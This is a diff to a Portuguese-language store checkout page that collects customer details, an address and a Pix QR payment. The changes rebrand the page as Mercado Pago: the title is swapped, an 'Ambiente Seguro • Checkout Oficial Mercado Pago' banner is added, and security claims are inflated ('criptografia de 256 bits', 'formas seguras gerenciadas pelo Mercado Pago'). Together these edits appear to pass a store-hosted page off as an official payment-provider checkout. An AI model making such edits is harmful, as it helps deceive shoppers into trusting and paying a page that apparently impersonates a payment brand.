@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-  <title>Finalizar pedido — Modalle Jeans</title>
+  <title>Finalizar pedido — Mercado Pago</title>
   <link rel="preconnect" href="https://http2.mlstatic.com">
   <script type="module" src="/assets/boxes-tiktok.js?v=2"></script>
   <style>
@@ -35,10 +35,10 @@
   --mp-navy: #002c6c;
   --bg-page: #f5f6f8;
   --bg-card: #ffffff;
-  --border-card: #eef0f3;
-  --border-input: #d1d5db;
-  --text-main: #111827;
-  --text-sub: #64748b;
+  --border-card: #e2e8f0;
+  --border-input: #cbd5e1;
+  --text-main: #0f172a;
+  --text-sub: #475569;
   --font-base: 'Proxima Nova', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 }
 
@@ -53,8 +53,8 @@ html, body {
   background-color: var(--bg-page);
   color: var(--text-main);
   font-family: var(--font-base);
-  font-size: 14px;
-  font-weight: 400;
+  font-size: 15px;
+  font-weight: 500;
   line-height: 1.5;
   -webkit-font-smoothing: antialiased;
   min-height: 100vh;
@@ -71,67 +71,89 @@ a { color: inherit; text-decoration: none; }
   max-width: 520px;
   margin: 0 auto;
   min-height: 100vh;
-  padding: 16px 16px 40px;
+  padding: 16px 16px 48px;
   display: flex;
   flex-direction: column;
 }
 
 @media (min-width: 640px) {
   body {
-    background-color: #ebedf2;
-    padding: 32px 16px 60px;
+    background-color: #e9ecef;
+    padding: 32px 16px 64px;
   }
   .checkout-shell {
     background: #ffffff;
-    border-radius: 16px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06);
-    border: 1px solid #e2e8f0;
+    border-radius: 18px;
+    box-shadow: 0 12px 36px rgba(0, 0, 0, 0.07);
+    border: 1.5px solid #cbd5e1;
     min-height: auto;
-    padding: 28px 28px 44px;
+    padding: 30px 28px 48px;
   }
 }
 
-/* Header */
+/* Header - Centralizado, Maior e em Evidência */
 .mp-header {
-  margin-bottom: 14px;
-}
-.mp-brand-row {
+  margin-bottom: 22px;
+  text-align: center;
   display: flex;
+  flex-direction: column;
   align-items: center;
-  margin-bottom: 10px;
-  padding-left: 2px;
+}
+.mp-brand-center {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-bottom: 12px;
+  width: 100%;
 }
 .mp-logo-img {
-  height: 28px;
+  height: 48px;
   width: auto;
+  max-width: 220px;
   display: block;
+  object-fit: contain;
+}
+.mp-trust-banner {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 6px 16px;
+  background: #f0f9ff;
+  border: 1.5px solid #bae6fd;
+  border-radius: 24px;
+  color: #0369a1;
+  font-size: 13.5px;
+  font-weight: 700;
+  margin-bottom: 10px;
+  box-shadow: 0 1px 3px rgba(0, 158, 227, 0.08);
 }
 .store-pill-wrap {
   text-align: center;
-  margin-bottom: 14px;
 }
 .store-pill {
   display: inline-flex;
   align-items: center;
-  gap: 7px;
-  padding: 4px 14px;
-  background: #e9ecf0;
+  gap: 8px;
+  padding: 5px 16px;
+  background: #f8fafc;
+  border: 1.5px solid #e2e8f0;
   border-radius: 20px;
 }
 .store-pill-badge {
   display: grid;
   place-items: center;
-  width: 18px;
-  height: 18px;
-  background: #4f46e5;
+  width: 20px;
+  height: 20px;
+  background: #009ee3;
   color: #fff;
   font-size: 11px;
-  font-weight: 600;
+  font-weight: 800;
   border-radius: 50%;
 }
 .store-pill-name {
-  font-size: 13px;
-  font-weight: 600;
+  font-size: 13.5px;
+  font-weight: 700;
   color: #334155;
 }
 
@@ -140,12 +162,12 @@ a { color: inherit; text-decoration: none; }
   display: flex;
   align-items: center;
   gap: 14px;
-  padding: 12px 16px;
+  padding: 14px 16px;
   background: #ffffff;
-  border: 1px solid #eef0f3;
+  border: 1.5px solid #e2e8f0;
   border-radius: 14px;
-  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.03);
-  margin-bottom: 18px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.03);
+  margin-bottom: 20px;
 }
 @media (min-width: 640px) {
   .product-card {
@@ -153,12 +175,12 @@ a { color: inherit; text-decoration: none; }
   }
 }
 .product-thumb {
-  width: 60px;
-  height: 60px;
-  min-width: 60px;
-  max-width: 60px;
-  border-radius: 10px;
-  border: 1px solid #e2e8f0;
+  width: 66px;
+  height: 66px;
+  min-width: 66px;
+  max-width: 66px;
+  border-radius: 12px;
+  border: 1.5px solid #cbd5e1;
   overflow: hidden;
   background: #ffffff;
   display: flex;
@@ -175,38 +197,37 @@ a { color: inherit; text-decoration: none; }
   flex: 1;
   min-width: 0;
 }
-/* Títulos dos cards: Proxima Nova Semibold 16px */
 .product-title {
-  font-size: 16px;
-  font-weight: 600;
-  color: #111827;
-  margin: 0 0 2px;
+  font-size: 16.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin: 0 0 3px;
   white-space: nowrap;
   overflow: hidden;
   text-overflow: ellipsis;
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .product-subtitle {
-  font-size: 13px;
-  font-weight: 400;
-  color: #64748b;
-  margin: 0 0 2px;
+  font-size: 14px;
+  font-weight: 600;
+  color: #334155;
+  margin: 0 0 3px;
   white-space: nowrap;
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .product-qty {
-  font-size: 13px;
-  font-weight: 400;
-  color: #94a3b8;
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #64748b;
   margin: 0;
 }
 .product-price {
-  font-size: 16px;
-  font-weight: 600;
-  color: #111827;
+  font-size: 18px;
+  font-weight: 700;
+  color: #009ee3;
   white-space: nowrap;
   margin-left: auto;
+  flex-shrink: 0;
 }
 
 /* Stepper */
@@ -214,7 +235,7 @@ a { color: inherit; text-decoration: none; }
   display: flex;
   list-style: none;
   padding: 0 10px;
-  margin: 12px 0 22px;
+  margin: 14px 0 24px;
   position: relative;
 }
 .stepper li {
@@ -225,11 +246,11 @@ a { color: inherit; text-decoration: none; }
 .stepper li:not(:last-child)::after {
   content: '';
   position: absolute;
-  top: 15px;
+  top: 16px;
   left: 50%;
   width: 100%;
-  height: 2.5px;
-  background: #e2e8f0;
+  height: 3px;
+  background: #cbd5e1;
   z-index: 1;
 }
 .stepper li.done:not(:last-child)::after,
@@ -248,30 +269,31 @@ a { color: inherit; text-decoration: none; }
   padding: 0;
 }
 .step-circle {
-  width: 30px;
-  height: 30px;
+  width: 32px;
+  height: 32px;
   border-radius: 50%;
   display: flex;
   align-items: center;
   justify-content: center;
-  font-size: 13px;
-  font-weight: 600;
+  font-size: 14px;
+  font-weight: 700;
   background: #ffffff;
-  color: #94a3b8;
-  border: 2px solid #cbd5e1;
+  color: #64748b;
+  border: 2.5px solid #94a3b8;
   transition: all 0.2s;
 }
 .step-circle svg {
-  width: 14px;
-  height: 14px;
+  width: 16px;
+  height: 16px;
   stroke: #ffffff;
-  stroke-width: 3;
+  stroke-width: 3.2;
   fill: none;
 }
 .stepper li.active .step-circle {
   background: #009ee3;
   color: #ffffff;
   border-color: #009ee3;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.2);
 }
 .stepper li.done .step-circle,
 .stepper li.completed .step-circle {
@@ -280,50 +302,48 @@ a { color: inherit; text-decoration: none; }
   border-color: #009ee3;
 }
 .step-label {
-  font-size: 13px;
-  font-weight: 400;
+  font-size: 13.5px;
+  font-weight: 600;
   margin-top: 6px;
-  color: #94a3b8;
+  color: #64748b;
 }
 .stepper li.active .step-label {
-  color: #111827;
-  font-weight: 600;
+  color: #0f172a;
+  font-weight: 700;
 }
 .stepper li.done .step-label,
 .stepper li.completed .step-label {
-  color: #64748b;
+  color: #334155;
 }
 
-/* Títulos das etapas: Proxima Nova Semibold 20px */
+/* Titles */
 .section-title {
-  font-size: 20px;
-  font-weight: 600;
-  color: #111827;
+  font-size: 22px;
+  font-weight: 700;
+  color: #0f172a;
   margin-bottom: 4px;
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .section-desc {
-  font-size: 13px;
-  font-weight: 400;
-  color: #64748b;
-  margin-bottom: 14px;
+  font-size: 14.5px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 16px;
 }
 
 /* Form Card */
 .form-card {
   background: #ffffff;
-  border: 1px solid #eef0f3;
-  border-radius: 14px;
-  padding: 18px 16px;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 16px;
+  padding: 20px 18px;
   display: flex;
   flex-direction: column;
-  gap: 14px;
-  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+  gap: 16px;
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
 }
 @media (min-width: 640px) {
   .form-card {
     background: #f8fafc;
-    border-color: #e2e8f0;
   }
 }
 
@@ -331,22 +351,21 @@ a { color: inherit; text-decoration: none; }
   display: flex;
   flex-direction: column;
 }
-/* Campos e informações: Proxima Nova Regular 14px */
 .field label {
-  font-size: 14px;
-  font-weight: 400;
-  color: #374151;
+  font-size: 15px;
+  font-weight: 700;
+  color: #0f172a;
   margin-bottom: 6px;
 }
 .field input, .field select {
   width: 100%;
-  height: 48px;
-  padding: 0 14px;
+  height: 52px;
+  padding: 0 16px;
   background: #ffffff;
-  border: 1.5px solid #d1d5db;
-  border-radius: 10px;
-  font-size: 15px;
-  font-weight: 400;
+  border: 1.8px solid #cbd5e1;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
   color: #0f172a;
   outline: none;
   box-sizing: border-box;
@@ -354,18 +373,19 @@ a { color: inherit; text-decoration: none; }
 }
 .field input::placeholder {
   color: #94a3b8;
+  font-weight: 400;
 }
 .field input:focus, .field select:focus {
   border-color: #009ee3;
-  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.15);
+  box-shadow: 0 0 0 3.5px rgba(0, 158, 227, 0.2);
 }
 .field [aria-invalid="true"] {
   border-color: #ef4444;
 }
 .field-error {
-  color: #ef4444;
-  font-size: 12px;
-  font-weight: 400;
+  color: #dc2626;
+  font-size: 13px;
+  font-weight: 600;
   margin-top: 4px;
 }
 .field-error:empty { display: none; }
@@ -387,67 +407,69 @@ a { color: inherit; text-decoration: none; }
   align-items: center;
 }
 .cep-field-wrap input {
-  padding-right: 105px;
+  padding-right: 115px;
 }
 .btn-buscar-cep {
   position: absolute;
-  right: 12px;
+  right: 14px;
   color: #009ee3;
-  font-size: 14px;
-  font-weight: 600;
-  padding: 6px 8px;
+  font-size: 14.5px;
+  font-weight: 700;
+  padding: 6px 10px;
   background: none;
   border: none;
   cursor: pointer;
 }
+.btn-buscar-cep:hover {
+  text-decoration: underline;
+}
 #cepStatus {
-  font-size: 13px;
-  font-weight: 400;
-  color: #64748b;
-  margin-top: 4px;
+  font-size: 13.5px;
+  font-weight: 600;
+  color: #0284c7;
+  margin-top: 5px;
 }
 #cepStatus:empty { display: none; }
 
 /* Shipping Card */
 .shipping-card {
-  margin-top: 16px;
+  margin-top: 18px;
 }
-/* Títulos dos cards: Proxima Nova Semibold 16px */
 .shipping-title {
-  font-size: 16px;
-  font-weight: 600;
-  color: #111827;
+  font-size: 17px;
+  font-weight: 700;
+  color: #0f172a;
   margin-bottom: 4px;
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .shipping-desc {
-  font-size: 13px;
-  font-weight: 400;
-  color: #64748b;
-  margin-bottom: 10px;
+  font-size: 14px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 12px;
 }
 .shipping-option {
   border: 2px solid #009ee3;
   background: #ffffff;
-  border-radius: 12px;
-  padding: 12px 14px;
+  border-radius: 14px;
+  padding: 14px 16px;
   display: flex;
   align-items: center;
-  gap: 12px;
+  gap: 14px;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.1);
 }
 .shipping-radio {
   display: flex;
   align-items: center;
   justify-content: center;
-  width: 20px;
-  height: 20px;
+  width: 22px;
+  height: 22px;
   border-radius: 50%;
   border: 2.5px solid #009ee3;
   flex-shrink: 0;
 }
 .shipping-radio-dot {
-  width: 10px;
-  height: 10px;
+  width: 11px;
+  height: 11px;
   border-radius: 50%;
   background: #009ee3;
 }
@@ -461,29 +483,27 @@ a { color: inherit; text-decoration: none; }
   flex: 1;
   min-width: 0;
 }
-/* Campos e informações: Proxima Nova Regular / Semibold */
 .shipping-name {
-  font-size: 14px;
-  font-weight: 600;
+  font-size: 15px;
+  font-weight: 700;
   color: #009ee3;
   margin: 0;
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .shipping-sub {
-  font-size: 13px;
-  font-weight: 400;
-  color: #64748b;
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #334155;
   margin: 2px 0 3px;
-  line-height: 1.3;
+  line-height: 1.35;
 }
 .shipping-deadline {
-  font-size: 13px;
-  font-weight: 600;
+  font-size: 13.5px;
+  font-weight: 700;
   color: #009ee3;
   margin: 0;
 }
 .correios-logo {
-  height: 22px;
+  height: 24px;
   width: auto;
   flex-shrink: 0;
 }
@@ -492,16 +512,16 @@ a { color: inherit; text-decoration: none; }
 .payment-methods {
   display: flex;
   flex-direction: column;
-  gap: 10px;
+  gap: 12px;
 }
 .payment-card {
   position: relative;
   display: flex;
   align-items: center;
   justify-content: space-between;
-  padding: 14px 16px;
+  padding: 16px 18px;
   background: #ffffff;
-  border: 1.5px solid #eef0f3;
+  border: 1.8px solid #e2e8f0;
   border-radius: 14px;
   box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
   transition: all 0.2s;
@@ -510,8 +530,9 @@ a { color: inherit; text-decoration: none; }
   text-align: left;
 }
 .payment-card.active {
-  border: 2px solid #009ee3;
+  border: 2.2px solid #009ee3;
   background: #ffffff;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.12);
 }
 .payment-card-left {
   display: flex;
@@ -519,8 +540,8 @@ a { color: inherit; text-decoration: none; }
   gap: 14px;
 }
 .pm-icon-wrap {
-  width: 42px;
-  height: 42px;
+  width: 44px;
+  height: 44px;
   border-radius: 50%;
   display: grid;
   place-items: center;
@@ -532,43 +553,44 @@ a { color: inherit; text-decoration: none; }
 }
 .pm-icon-wrap.card {
   background: #edf3f8;
-  color: #64748b;
+  color: #475569;
 }
 .pm-icon-wrap.wallet {
   background: #edf3f8;
-  color: #64748b;
+  color: #475569;
 }
-/* Títulos dos cards: Proxima Nova Semibold 16px */
 .pm-texts h3 {
-  font-size: 16px;
-  font-weight: 600;
-  color: #111827;
+  font-size: 16.5px;
+  font-weight: 700;
+  color: #0f172a;
   margin: 0 0 2px;
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .pm-texts p {
-  font-size: 13px;
-  font-weight: 400;
-  color: #64748b;
+  font-size: 14px;
+  font-weight: 500;
+  color: #475569;
   margin: 0;
 }
 .pm-chevron {
   color: #009ee3;
 }
 
-/* Botões azuis: Proxima Nova Semibold 16px */
+/* Botões Azuis: Grandes, Chamativos e Confortáveis */
 .btn-primary {
   width: 100%;
-  height: 50px;
+  height: 54px;
   background: #009ee3;
   color: #ffffff;
-  border-radius: 10px;
-  font-size: 16px;
-  font-weight: 600;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: 0.2px;
   display: flex;
   align-items: center;
   justify-content: center;
-  margin-top: 18px;
+  gap: 8px;
+  margin-top: 20px;
+  box-shadow: 0 4px 14px rgba(0, 158, 227, 0.35);
   transition: background 0.15s, transform 0.05s;
 }
 .btn-primary:hover {
@@ -577,89 +599,86 @@ a { color: inherit; text-decoration: none; }
 .btn-primary:active {
   transform: scale(0.99);
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .security-note {
   display: flex;
   align-items: center;
   justify-content: center;
-  gap: 6px;
-  color: #94a3b8;
-  font-size: 13px;
-  font-weight: 400;
+  gap: 7px;
+  color: #64748b;
+  font-size: 13.5px;
+  font-weight: 600;
   margin-top: 12px;
 }
 
 /* Step 4 Pagamento Specifics */
 .pix-pay-card {
   background: #ffffff;
-  border: 1px solid #eef0f3;
-  border-radius: 16px;
-  padding: 22px 18px 26px;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 18px;
+  padding: 24px 20px 28px;
   text-align: center;
-  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
 }
 @media (min-width: 640px) {
   .pix-pay-card {
     background: #f8fafc;
-    border-color: #e2e8f0;
   }
 }
-/* Títulos das etapas: Proxima Nova Semibold 20px */
 .pix-pay-title {
-  font-size: 20px;
-  font-weight: 600;
-  color: #111827;
+  font-size: 23px;
+  font-weight: 700;
+  color: #0f172a;
   margin-bottom: 4px;
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .pix-pay-desc {
-  font-size: 13px;
-  font-weight: 400;
-  color: #64748b;
-  margin-bottom: 16px;
+  font-size: 14.5px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 18px;
 }
 .qr-frame {
   display: inline-flex;
-  padding: 12px;
+  padding: 14px;
   background: #ffffff;
-  border: 1.5px solid #e2e8f0;
-  border-radius: 16px;
-  margin-bottom: 16px;
+  border: 2px solid #cbd5e1;
+  border-radius: 18px;
+  margin-bottom: 18px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
 }
 .qr-frame canvas, .qr-frame svg, .qr-frame img {
-  width: 170px;
-  height: 170px;
+  width: 190px;
+  height: 190px;
   display: block;
 }
 
 .copy-input-block {
   text-align: left;
-  margin-bottom: 12px;
+  margin-bottom: 14px;
 }
 .copy-label {
   display: block;
-  font-size: 13px;
-  font-weight: 600;
-  color: #374151;
+  font-size: 14px;
+  font-weight: 700;
+  color: #1e293b;
   margin-bottom: 6px;
 }
 .copy-box {
   display: flex;
   align-items: center;
   background: #ffffff;
-  border: 1.5px solid #d1d5db;
-  border-radius: 10px;
+  border: 1.8px solid #cbd5e1;
+  border-radius: 12px;
   overflow: hidden;
-  height: 46px;
+  height: 50px;
 }
 .copy-box input {
   flex: 1;
   border: 0;
   height: 100%;
-  padding: 0 12px;
-  font-size: 13.5px;
-  font-weight: 400;
-  color: #475569;
+  padding: 0 14px;
+  font-size: 14px;
+  font-weight: 600;
+  color: #334155;
   outline: none;
   background: transparent;
   min-width: 0;
@@ -668,67 +687,66 @@ a { color: inherit; text-decoration: none; }
   text-overflow: ellipsis;
 }
 .copy-inline-btn {
-  padding: 0 14px;
+  padding: 0 16px;
   height: 100%;
   display: flex;
   align-items: center;
   color: #009ee3;
-  border-left: 1px solid #e2e8f0;
+  border-left: 1.5px solid #e2e8f0;
   background: #f8fafc;
 }
 
-/* Botões azuis: Proxima Nova Semibold 16px */
 .btn-copy-pix {
   width: 100%;
-  height: 48px;
+  height: 52px;
   background: #009ee3;
   color: #ffffff;
-  border-radius: 10px;
-  font-size: 16px;
-  font-weight: 600;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 700;
   display: flex;
   align-items: center;
   justify-content: center;
   gap: 8px;
-  margin-bottom: 14px;
+  margin-bottom: 16px;
+  box-shadow: 0 4px 14px rgba(0, 158, 227, 0.35);
   transition: background 0.15s;
 }
 .btn-copy-pix svg {
-  width: 18px;
-  height: 18px;
+  width: 20px;
+  height: 20px;
 }
 .btn-copy-pix:hover {
   background: #0084c2;
 }
 
 .amount-block {
-  margin-bottom: 14px;
+  margin-bottom: 16px;
   text-align: center;
 }
-/* Textos secundários: Proxima Nova Regular 13px */
 .amount-title {
   display: block;
-  font-size: 13px;
-  font-weight: 400;
+  font-size: 14px;
+  font-weight: 600;
   color: #64748b;
   margin-bottom: 2px;
 }
-/* Valor do pedido: Proxima Nova Semibold 24px */
 .amount-number {
-  font-size: 24px;
-  font-weight: 600;
+  font-size: 28px;
+  font-weight: 700;
   color: #0f172a;
 }
 
 .instant-notice {
   background: #eff6ff;
-  border-radius: 10px;
-  padding: 12px 14px;
+  border: 1.5px solid #bfdbfe;
+  border-radius: 12px;
+  padding: 14px 16px;
   display: flex;
   align-items: center;
   gap: 12px;
   text-align: left;
-  margin-bottom: 18px;
+  margin-bottom: 20px;
 }
 .instant-icon {
   color: #0284c7;
@@ -738,13 +756,13 @@ a { color: inherit; text-decoration: none; }
 }
 .instant-content strong {
   display: block;
-  font-size: 14px;
-  font-weight: 600;
+  font-size: 14.5px;
+  font-weight: 700;
   color: #0369a1;
 }
 .instant-content p {
-  font-size: 13px;
-  font-weight: 400;
+  font-size: 13.5px;
+  font-weight: 500;
   color: #0284c7;
   line-height: 1.35;
 }
@@ -752,18 +770,17 @@ a { color: inherit; text-decoration: none; }
 .how-to-block {
   text-align: center;
 }
-/* Títulos dos cards: Proxima Nova Semibold 16px */
 .how-to-title {
-  font-size: 16px;
-  font-weight: 600;
-  color: #111827;
-  margin-bottom: 10px;
+  font-size: 16.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 12px;
   text-align: left;
 }
 .how-to-grid {
   display: grid;
   grid-template-columns: repeat(3, 1fr);
-  gap: 8px;
+  gap: 10px;
 }
 .how-item {
   display: flex;
@@ -772,29 +789,29 @@ a { color: inherit; text-decoration: none; }
   text-align: center;
 }
 .how-badge {
-  width: 20px;
-  height: 20px;
-  border-radius: 5px;
+  width: 22px;
+  height: 22px;
+  border-radius: 6px;
   background: #009ee3;
   color: #ffffff;
-  font-size: 11px;
-  font-weight: 600;
+  font-size: 12px;
+  font-weight: 700;
   display: grid;
   place-items: center;
   margin-bottom: 6px;
 }
 .how-icon-box {
-  width: 26px;
-  height: 26px;
+  width: 28px;
+  height: 28px;
   display: grid;
   place-items: center;
   margin-bottom: 6px;
 }
 .how-item p {
-  font-size: 12px;
-  font-weight: 400;
-  color: #374151;
-  line-height: 1.3;
+  font-size: 12.5px;
+  font-weight: 600;
+  color: #1e293b;
+  line-height: 1.35;
 }
 
 /* Toast Notification */
@@ -803,14 +820,14 @@ a { color: inherit; text-decoration: none; }
   bottom: 24px;
   left: 50%;
   transform: translateX(-50%);
-  background: rgba(15, 23, 42, 0.94);
+  background: rgba(15, 23, 42, 0.95);
   color: #ffffff;
-  padding: 10px 20px;
+  padding: 12px 24px;
   border-radius: 24px;
-  font-size: 14px;
-  font-weight: 600;
+  font-size: 15px;
+  font-weight: 700;
   z-index: 9999;
-  box-shadow: 0 4px 14px rgba(0,0,0,0.18);
+  box-shadow: 0 6px 18px rgba(0,0,0,0.22);
 }
 </style>
 </head>
@@ -820,8 +837,15 @@ a { color: inherit; text-decoration: none; }
 
   <main class="checkout-shell">
     <header class="mp-header">
-      <div class="mp-brand-row">
+      <div class="mp-brand-center">
         <img class="mp-logo-img" src="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.19.5/mercadopago/logo__large.png" alt="Mercado Pago">
+      </div>
+      <div class="mp-trust-banner">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#009ee3" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <path d="m9 12 2 2 4-4"/>
+        </svg>
+        <span>Ambiente Seguro • Checkout Oficial <strong>Mercado Pago</strong></span>
       </div>
       <div class="store-pill-wrap">
         <div class="store-pill">
@@ -870,7 +894,7 @@ a { color: inherit; text-decoration: none; }
     <!-- STEP 1: Seus dados -->
     <section class="checkout-step" data-panel="0">
       <h1 class="section-title">Seus dados</h1>
-      <p class="section-desc">Precisamos dessas informações para processar o envio.</p>
+      <p class="section-desc">Precisamos dessas informações para processar o seu envio com segurança.</p>
 
       <div class="form-card">
         <div class="field">
@@ -895,13 +919,18 @@ a { color: inherit; text-decoration: none; }
         </div>
       </div>
 
-      <button class="btn-primary" data-next type="button">Continuar para a entrega</button>
+      <button class="btn-primary" data-next type="button">
+        <span>Continuar para a entrega</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg>
+      </button>
       <div class="security-note">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#009ee3" stroke-width="2.2">
           <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
           <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
         </svg>
-        <span>Seus dados pessoais estão protegidos por criptografia</span>
+        <span>Seus dados pessoais estão protegidos por criptografia de 256 bits</span>
       </div>
     </section>
 
@@ -970,7 +999,7 @@ a { color: inherit; text-decoration: none; }
             <div class="shipping-radio-dot"></div>
           </div>
           <div class="shipping-truck">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <rect x="1" y="3" width="15" height="13"></rect>
               <polygon points="16 8 20 8 23 11 23 16 16 16 8"></polygon>
               <circle cx="5.5" cy="18.5" r="2.5"></circle>
@@ -990,39 +1019,44 @@ a { color: inherit; text-decoration: none; }
         </div>
       </div>
 
-      <button class="btn-primary" data-next type="button">Continuar para o pagamento</button>
+      <button class="btn-primary" data-next type="button">
+        <span>Continuar para o pagamento</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg>
+      </button>
       <div class="security-note">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#009ee3" stroke-width="2.2">
           <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
           <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
         </svg>
-        <span>Seus dados de entrega estão protegidos</span>
+        <span>Seu endereço de entrega é validado junto aos Correios</span>
       </div>
     </section>
 
     <!-- STEP 3: Como você quer pagar? -->
     <section class="checkout-step" data-panel="2" hidden>
       <h1 class="section-title">Como você quer pagar?</h1>
-      <p class="section-desc">Escolha um meio de pagamento.</p>
+      <p class="section-desc">Escolha uma das formas seguras gerenciadas pelo Mercado Pago.</p>
 
       <form id="checkoutForm" onsubmit="return false;">
         <div class="payment-methods">
           <div class="payment-card active">
             <div class="payment-card-left">
               <div class="pm-icon-wrap pix">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                   <path d="M12.0003 3.6L6.3433 9.257C5.5623 10.038 5.5623 11.304 6.3433 12.085L12.0003 17.742L17.6573 12.085C18.4383 11.304 18.4383 10.038 17.6573 9.257L12.0003 3.6Z"/>
                   <circle cx="12" cy="8" r="1.5" fill="#ffffff"/>
                   <circle cx="12" cy="13.5" r="1.5" fill="#ffffff"/>
                 </svg>
               </div>
               <div class="pm-texts">
-                <h3>Pix</h3>
+                <h3>Pix Mercado Pago</h3>
                 <p>Aprovação imediata e envio prioritário</p>
               </div>
             </div>
             <div class="pm-chevron">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                 <polyline points="9 18 15 12 9 6"></polyline>
               </svg>
             </div>
@@ -1031,7 +1065,7 @@ a { color: inherit; text-decoration: none; }
           <div class="payment-card">
             <div class="payment-card-left">
               <div class="pm-icon-wrap card">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                   <rect x="2" y="5" width="20" height="14" rx="2"/>
                   <line x1="2" y1="10" x2="22" y2="10"/>
                 </svg>
@@ -1046,7 +1080,7 @@ a { color: inherit; text-decoration: none; }
           <div class="payment-card">
             <div class="payment-card-left">
               <div class="pm-icon-wrap card">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                   <rect x="2" y="5" width="20" height="14" rx="2"/>
                   <line x1="2" y1="10" x2="22" y2="10"/>
                 </svg>
@@ -1061,7 +1095,7 @@ a { color: inherit; text-decoration: none; }
           <div class="payment-card">
             <div class="payment-card-left">
               <div class="pm-icon-wrap wallet">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                   <path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4"/>
                   <path d="M4 6v12a2 2 0 0 0 2 2h14v-4"/>
                   <circle cx="18" cy="14" r="1"/>
@@ -1075,13 +1109,18 @@ a { color: inherit; text-decoration: none; }
           </div>
         </div>
 
-        <button class="btn-primary" id="finish" type="submit">Continuar com Pix</button>
+        <button class="btn-primary" id="finish" type="submit">
+          <span>Continuar com Pix Mercado Pago</span>
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="9 18 15 12 9 6"></polyline>
+          </svg>
+        </button>
         <div class="security-note">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
